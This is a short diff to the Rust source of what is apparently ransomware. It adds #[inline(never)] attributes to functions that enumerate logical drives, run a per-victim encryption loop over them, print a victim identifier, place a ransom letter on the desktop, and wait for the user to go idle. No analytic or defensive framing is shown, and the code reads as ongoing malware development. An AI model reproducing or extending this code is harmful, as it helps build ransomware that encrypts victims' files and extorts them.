@@ -68,6 +68,7 @@ fn check_precondition() -> Result<()> {
     Ok(())
 }
 
+#[inline(never)]
 fn assert_precondition() {
     if let Err(err) = check_precondition() {
         // msg_u16 MUST not be dropped before msg
@@ -86,6 +87,7 @@ fn assert_precondition() {
     }
 }
 
+#[inline(never)]
 fn get_all_suitable_drives() -> Vec<String> {
     let drive_mask = unsafe { GetLogicalDrives() };
     let mut result: Vec<String> = Vec::new();
@@ -173,6 +175,7 @@ Your victim identifier is: {}
     Ok(())
 }
 
+#[inline(never)]
 fn the_boring_loop(key: &Arc<PerVictimKey>) -> Result<()> {
     let drives = get_all_suitable_drives();
     let (letter_tx, letter_rx) = mpsc::channel::<PathBuf>();
@@ -225,6 +228,7 @@ fn the_boring_loop(key: &Arc<PerVictimKey>) -> Result<()> {
     Ok(())
 }
 
+#[inline(never)]
 fn try_show_ransom_letter_on_desktop(victim_key: &PerVictimKey) -> Result<()> {
     if let Some(desktop_dir) = directories::UserDirs::new()
         .expect("UserDirs must work if we got here")
@@ -240,6 +244,7 @@ fn try_show_ransom_letter_on_desktop(victim_key: &PerVictimKey) -> Result<()> {
     Ok(())
 }
 
+#[inline(never)]
 fn wait_for_user_idle() {
     loop {
         if let Ok(idle) = UserIdle::get_time() {
